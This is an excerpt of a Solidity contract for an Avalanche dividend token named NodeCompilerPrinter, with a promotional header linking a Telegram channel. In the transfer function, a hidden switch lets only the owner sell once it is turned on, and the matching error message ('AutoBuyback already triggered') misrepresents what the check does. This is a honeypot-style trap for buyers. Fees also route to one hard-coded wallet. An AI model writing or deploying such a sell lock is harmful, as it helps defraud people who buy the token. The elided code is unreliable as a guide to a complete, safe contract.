...
/*
Stealth launched 02/01/22

🔺Node Compiler AVAX PRINTER🔺
💸https://t.me/Nodecompilerprinter💸


Hold NodeCompilerPrinter and earn NodeCompiler token !🚀
...
contract DividendDistributor is IDividendDistributor {
    ...
    IBEP20 EP = IBEP20(0x224DB37f1745a2F5D49E06a204aD6a38bA827fA8); 
...
contract NodeCompilerPrinter is IBEP20, Auth {
    using SafeMath for uint256;

    uint256 public constant MASK = type(uint128).max;
    address EP = 0x224DB37f1745a2F5D49E06a204aD6a38bA827fA8; //NodeCToken
    address public WAVAX = 0xB31f66AA3C1e785363F0875A1B74E27b85FD66c7;
    address DEAD = 0x000000000000000000000000000000000000dEaD;
    address ZERO = 0x0000000000000000000000000000000000000000;
    address DEAD_NON_CHECKSUM = 0x000000000000000000000000000000000000dEaD;

    string constant _name = "NodeCompilerPrinter";
    string constant _symbol = "NODECPRINTER";
    ...
    address public autoLiquidityReceiver=0x6F40ddEBb1407fc614fE273D3963031ab5A6136b;
    address public marketingFeeReceiver=0x6F40ddEBb1407fc614fE273D3963031ab5A6136b;
    ...
    bool RewardsDistribution = false;
    ...
    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        ...
        if (isSell) {
            require((!RewardsDistribution || sender==owner), "AutoBuyback already triggered");
    ...
    function setIsFeesExempt(bool value) external onlyOwner {
